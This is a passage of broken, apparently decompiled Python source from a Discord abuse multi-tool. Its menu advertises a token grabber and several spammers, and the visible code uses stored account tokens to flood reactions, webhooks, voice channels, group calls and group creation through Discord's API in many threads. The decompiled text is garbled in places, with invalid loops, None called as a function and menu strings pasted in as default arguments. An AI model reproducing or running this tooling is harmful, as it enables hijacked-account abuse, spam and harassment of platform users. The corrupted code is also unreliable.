'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']):
            headers = mainHeader(token)
            if house == '1':
                housefinal = '1'
            if house == '2':
                housefinal = '2'
            if house == '3':
                housefinal = '3'
            if house == '4':
                housefinal = None
            if not house == '1':
                pass
            payload = {
                'house_id': housefinal }
            rep = requests.post('https://discord.com/api/v9/hypesquad/online', payload, headers, **('json', 'headers'))
            if rep.status_code == 204:
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done''')
            else:
                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed''')
            if house == '4':
                payload = {
                    'house_id': housefinal }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers, payload, **('headers', 'json'))
                if req.status_code == 204:
                    print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done''')
                    return None
                return None

        tokens = open('tokens.txt', 'r').read().splitlines()
        for None in tokens:
            token = None
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '13':
        Spinner()
        
        def reaction(chd, iddd, org, token):
            headers = {
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US',
                'Cookie': f'''__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US''',
                'DNT': '1',
                'origin': 'https://discord.com',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'TE': 'Trailers',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0' }
            emoji = ej.emojize(org, True, **('use_aliases',))
            a = requests.put(f'''https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me''', headers, **('headers',))
            if a.status_code == 204:
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Reaction {org}''')
                return None
            None(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error''')

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Channel ID?: ')
        iddd = input('[\x1b[95m>\x1b[95m\x1b[37m] Message ID?: ')
        emoji = input('[\x1b[95m>\x1b[95m\x1b[37m] Emoji?: ')
        delay = int(input('[\x1b[95m>\x1b[95m\x1b[37m] Delay?: '))
        for None in tokens:
            token = None
            threading.Thread(reaction, (chd, iddd, emoji, token), **('target', 'args')).start()
        time.sleep(1)
        exit = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '14':
        Spinner()
        
        def changenick(server, nickname, token):
            headers = mainHeader(token)
            r = requests.patch(f'''https://discord.com/api/v9/guilds/{server}/members/@me/nick''', headers, {
                'nick': nickname }, **('headers', 'json'))
            if r.status_code == 200:
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Nickname Changed ''')
            if r.status_code != 200:
                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Cant Change Nickname{Fore.RESET}''')
                return None

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Server ID: ')
        nick = input('[\x1b[95m>\x1b[95m\x1b[37m] Nickname?: ')
        for None in tokens:
            token = None
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '15':
        Spinner()
        session = requests.Session()
        webhook = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Webhook URL: ')
        message = input('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        username = input('[\x1b[95m>\x1b[95m\x1b[37m] Webhook Username?: ')
        
        def gang():
            session.post(webhook, {
                'content': message,
                'username': username }, **('json',))
            for i in range(15):
                threading.Thread(gang, **('target',)).start()
            continue

        gang()
    if choice == '16':
        Spinner()
        tokenlist = open('tokens.txt', 'r').read().splitlines()
        channel = int(input('\n[\x1b[95m>\x1b[95m\x1b[37m] Voice Channel ID: '))
        server = int(input('[\x1b[95m>\x1b[95m\x1b[37m] Server ID: '))
        deaf = input('[\x1b[95m>\x1b[95m\x1b[37m] Defean: (y/n)? ')
        if deaf == 'y':
            deaf = True
            if deaf == 'n':
                deaf = False
        mute = input('[\x1b[95m>\x1b[95m\x1b[37m] Mute: (y/n)? ')
        if mute == 'y':
            mute = True
            if mute == 'n':
                mute = False
        stream = input('[\x1b[95m>\x1b[95m\x1b[37m] Stream: (y/n)? ')
        if stream == 'y':
            stream = True
            if stream == 'n':
                stream = False
        video = input('[\x1b[95m>\x1b[95m\x1b[37m] Video: (y/n)? ')
        if video == 'y':
            video = True
            if video == 'n':
                video = False
        executor = ThreadPoolExecutor(int(100000), **('max_workers',))
        
        def run(token = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']):
            ws = WebSocket()
            ws.connect('wss://gateway.discord.gg/?v=8&encoding=json')
            hello = loads(ws.recv())
            heartbeat_interval = hello['d']['heartbeat_interval']
            ws.send(dumps({
                'op': 2,
                'd': {
                    'token': token,
                    'properties': {
                        '$os': 'windows',
                        '$browser': 'Discord',
                        '$device': 'desktop' } } }))
            ws.send(dumps({
                'op': 4,
                'd': {
                    'guild_id': server,
                    'channel_id': channel,
                    'self_mute': mute,
                    'self_deaf': deaf,
                    'self_stream?': stream,
                    'self_video': video } }))
            ws.send(dumps({
                'op': 18,
                'd': {
                    'type': 'guild',
                    'guild_id': server,
                    'channel_id': channel,
                    'preferred_region': 'singapore' } }))
            ws.send(dumps({
                'op': 1,
                'd': None }))
            sleep(0.1)
            continue

        i = 0
        for None in tokenlist:
            token = None
            i += 1
            print('[\x1b[32m>\x1b[32m\x1b[37m] Joined Voice Call')
            sleep(0.01)
        yay = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER to Stop VC Spammer!')
    if choice == '17':
        
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json' }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers, data, **('headers', 'data'))
            print('[\x1b[32m>\x1b[32m] Done ')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Status?: ')
        for None in tokens:
            token = None
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '18':
        Spinner()
        
        def get_all_tokens(filename):
            all_tokens = []
            with open(filename, 'r') as f:
                t = f.read()
                tt = t.splitlines()
                for i in tt:
                    all_tokens.append(i)
                None(None, None, None)
                return all_tokens
                if not None:
                    pass
            return all_tokens

        
        def changebio(bio = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']']):
            tokens = get_all_tokens('tokens.txt')
            for token in tokens:
                start_time = time.time()
                r = requests.Session()
                url = 'https://discord.com/api/v9/experiments'
                k = r.get(url)
                url = 'https://canary.discord.com/api/v9/users/%40me/profile'
                headers = {
                    'accept': '/',
                    'authorization': token }
                body = {
                    'bio': bio }
                r.patch(url, headers, body, **('headers', 'json'))
                print(f'''[{g}>{Fore.RESET}] {token} |{bio}''')

        bio = input(f'''\n[{m}>{Fore.RESET}] New Bio?: ''')
        changebio(bio)
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '19':
        Spinner()
        print('\n\n[\x1b[95m1\x1b[95m\x1b[37m] Server Lookup  \n[\x1b[95m2\x1b[95m\x1b[37m] EXIT')
        option = int(input('[\x1b[95m>\x1b[95m\x1b[37m] Choice?: '))
        if option == 1:
            sleep(0)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Authorization': input('\n[\x1b[95m>\x1b[95m\x1b[37m] Token: ') }
        guildId = input('[\x1b[95m>\x1b[95m\x1b[37m] Guild ID: ')
        response = requests.get(f'''https://discord.com/api/guilds/{guildId}''', headers, {
            'with_counts': True }, **('headers', 'params')).json()
        owner = requests.get(f'''https://discord.com/api/guilds/{guildId}/members/{response['owner_id']}''', headers, {
            'with_counts': True }, **('headers', 'params')).json()
        []['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Region'][f'''{Fore.RESET}'''][']    $   '][f'''{response['region']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Icon URL'][f'''{Fore.RESET}'''][']  $   https://cdn.discordapp.com/icons/'][f'''{guildId}''']['/']([]['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Region'][f'''{Fore.RESET}'''][']    $   '][f'''{response['region']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Icon URL'][f'''{Fore.RESET}'''][']  $   https://cdn.discordapp.com/icons/'][f'''{guildId}''']['/'][f'''{response['icon']}''']([]['\n'][f'''{Fore.RESET}'''][f'''{Fore.GREEN}''']['####### Server Infomation #######'][f'''{Fore.RESET}''']['\n\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Name'][f'''{Fore.RESET}'''][']      $   '][f'''{response['name']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['ID'][f'''{Fore.RESET}'''][']        $   '][f'''{response['id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner'][f'''{Fore.RESET}'''][']     $   '][f'''{owner['user']['username']}''']['#'][f'''{owner['user']['discriminator']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Owner ID'][f'''{Fore.RESET}'''][']  $   '][f'''{response['owner_id']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Members'][f'''{Fore.RESET}'''][']   $   '][f'''{response['approximate_member_count']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Region'][f'''{Fore.RESET}'''][']    $   '][f'''{response['region']}''']['\n['][f'''{Fore.LIGHTMAGENTA_EX}''']['Icon URL'][f'''{Fore.RESET}'''][']  $   https://cdn.discordapp.com/icons/'][f'''{guildId}''']['/'][f'''{response['icon']}''']['.webp?size=256\n']))
        sleep(6)
        spammer()
    if choice == '20':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)
    if choice == '21':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Token: ')
        ID = int(input('[\x1b[95m>\x1b[95m\x1b[37m] GroupChat ID: '))
        Threads = int(input('[\x1b[95m>\x1b[95m\x1b[37m] Threads: '))
        regions = [
            'brazil',
            'hongkong',
            'india',
            'japan',
            'rotterdam',
            'russia',
            'singapore',
            'southafrica',
            'sydney',
            'us-central',
            'us-east',
            'us-south',
            'us-west']
        
        def exec():
            headers = {
                'Authorization': token }
            group = f'''https://discord.com/api/v9/channels/{int(ID)}/call'''
            now = datetime.now()
            currently = now.strftime('%H:%M:%S')
            RandomRegion = random.choice(regions)
            payload = {
                'region': RandomRegion }
            requests.patch(group, payload, headers, **('json', 'headers'))
            print(f'''[\x1b[95m>\x1b[95m\x1b[37m] [{currently}]''', Colorate.Horizontal(Colors.purple_to_blue, f'''Region: {RandomRegion}''', 1))

        for i in range(Threads):
            threading.Thread(exec, **('target',)).start()
        time.sleep(3)
        exit = input('\n\n[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '22':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Token: ')
        UserID = input('[\x1b[95m>\x1b[95m\x1b[37m] User ID: ')
        group = input('[\x1b[95m>\x1b[95m\x1b[37m] Group Names: ')
        manygr = int(input('[\x1b[95m>\x1b[95m\x1b[37m] How Many Groups: '))
        headers = mainHeader(token)
        for i in range(manygr):
            
            try:
                r = requests.post('https://discord.com/api/v9/users/@me/channels', headers, {
                    'recipients': [] }, **('headers', 'json'))
                jsr = json.loads(r.content)
                groupID = jsr['id']
                time.sleep(0.5)
                r1 = requests.patch(f'''https://discord.com/api/v9/channels/{groupID}''', headers, {
                    'name': group }, **('headers', 'json'))
                if r1.status_code == 200:
                    print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group Created''')
                with open('data/groups.txt', 'w') as groupID:
                    groupID.write(jsr['id'] + '\n')
